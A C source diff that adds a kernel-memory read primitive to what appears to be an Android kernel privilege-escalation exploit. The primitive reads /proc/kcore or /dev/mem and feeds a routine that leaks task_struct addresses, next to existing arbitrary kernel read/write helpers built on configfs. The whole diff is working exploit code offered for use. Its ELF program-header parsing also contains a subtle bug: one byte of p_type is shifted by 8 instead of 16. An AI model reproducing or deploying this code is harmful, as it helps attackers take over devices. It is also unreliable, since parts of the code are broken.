@@ -831,3 +831,100 @@ ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len
 ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
   return configfs_read_once(fd, target, data, len);
 }
+
+/* ------------------------------------------------------------------ *
+ * Independent kernel-read backend (no ashmem / no configfs).
+ * Used by leak_task_struct() to turn a leaked mm_struct into a
+ * task_struct.  The two candidate primitives:
+ *   /proc/kcore : ELF core dump of the kernel; each PT_LOAD maps a
+ *                 kernel-virtual range, so a vaddr read is just
+ *                 pread at p_offset + (vaddr - p_vaddr).
+ *   /dev/mem    : raw physical RAM (CONFIG_STRICT_DEVMEM is not set on
+ *                 jinghu).  kmalloc'd objects and .data live in the
+ *                 linear/direct map, so phys = vaddr - DIRECT_MAP_BASE.
+ * ------------------------------------------------------------------ */
+enum { KREAD_NONE = 0, KREAD_KCORE, KREAD_DEVMEM };
+
+static int g_kread_fd = -1;
+static int g_kread_backend = KREAD_NONE;
+
+int kread_open(void) {
+  if (g_kread_backend != KREAD_NONE) return 0;
+
+  int fd = open("/proc/kcore", O_RDONLY | O_CLOEXEC);
+  if (fd >= 0) {
+    g_kread_fd = fd;
+    g_kread_backend = KREAD_KCORE;
+    pr_info("kread: backend=/proc/kcore fd=%d\n", fd);
+    return 0;
+  }
+
+  fd = open("/dev/mem", O_RDWR | O_CLOEXEC);
+  if (fd >= 0) {
+    g_kread_fd = fd;
+    g_kread_backend = KREAD_DEVMEM;
+    pr_info("kread: backend=/dev/mem fd=%d (phys = vaddr - %p)\n",
+            fd, (void *)(uintptr_t)DIRECT_MAP_BASE);
+    return 0;
+  }
+
+  pr_error("kread: neither /proc/kcore nor /dev/mem openable\n");
+  return -1;
+}
+
+void kread_close(void) {
+  if (g_kread_fd >= 0) close(g_kread_fd);
+  g_kread_fd = -1;
+  g_kread_backend = KREAD_NONE;
+}
+
+int kread_ready(void) { return g_kread_backend != KREAD_NONE; }
+
+/* Locate the PT_LOAD covering vaddr in /proc/kcore and return the file
+ * offset to pread from.  Returns -1 if not found / not an ELF64 core. */
+static off_t kcore_vaddr_to_off(int fd, uintptr_t vaddr) {
+  uint8_t ehdr[64];
+  if (pread(fd, ehdr, sizeof(ehdr), 0) != (ssize_t)sizeof(ehdr)) return -1;
+  if (ehdr[0] != 0x7f || ehdr[1] != 'E' || ehdr[2] != 'L' || ehdr[3] != 'F')
+    return -1;
+  if (ehdr[4] != 2) return -1;                 /* ELFCLASS64 */
+
+  uint16_t e_phnum = ehdr[56] | (ehdr[57] << 8);
+  uint64_t e_phoff = 0;
+  for (int i = 0; i < 8; i++)
+    e_phoff |= (uint64_t)ehdr[32 + i] << (8 * i);
+  uint16_t e_phentsize = ehdr[54] | (ehdr[55] << 8);
+  if (e_phentsize < 56) return -1;
+
+  for (uint16_t i = 0; i < e_phnum; i++) {
+    uint8_t ph[56];
+    off_t phoff = (off_t)(e_phoff + (uint64_t)i * e_phentsize);
+    if (pread(fd, ph, sizeof(ph), phoff) != (ssize_t)sizeof(ph)) return -1;
+    uint32_t p_type = ph[0] | (ph[1] << 8) | (ph[2] << 8) | (ph[3] << 24);
+    if (p_type != 1) continue;                /* PT_LOAD */
+    uint64_t p_vaddr = 0, p_offset = 0, p_filesz = 0;
+    for (int j = 0; j < 8; j++) {
+      p_vaddr  |= (uint64_t)ph[16 + j] << (8 * j);
+      p_offset |= (uint64_t)ph[8 + j]  << (8 * j);
+      p_filesz |= (uint64_t)ph[32 + j] << (8 * j);
+    }
+    if (vaddr >= p_vaddr && vaddr < p_vaddr + p_filesz)
+      return (off_t)(p_offset + (vaddr - p_vaddr));
+  }
+  return -1;
+}
+
+uint64_t kread64(uintptr_t vaddr) {
+  uint64_t val = 0;
+  if (g_kread_backend == KREAD_DEVMEM) {
+    uint64_t pa = vaddr - DIRECT_MAP_BASE;     /* linear map -> phys */
+    if (pread(g_kread_fd, &val, 8, (off_t)pa) != 8) return 0;
+  } else if (g_kread_backend == KREAD_KCORE) {
+    off_t off = kcore_vaddr_to_off(g_kread_fd, vaddr);
+    if (off < 0) return 0;
+    if (pread(g_kread_fd, &val, 8, off) != 8) return 0;
+  } else {
+    return 0;
+  }
+  return val;
+}
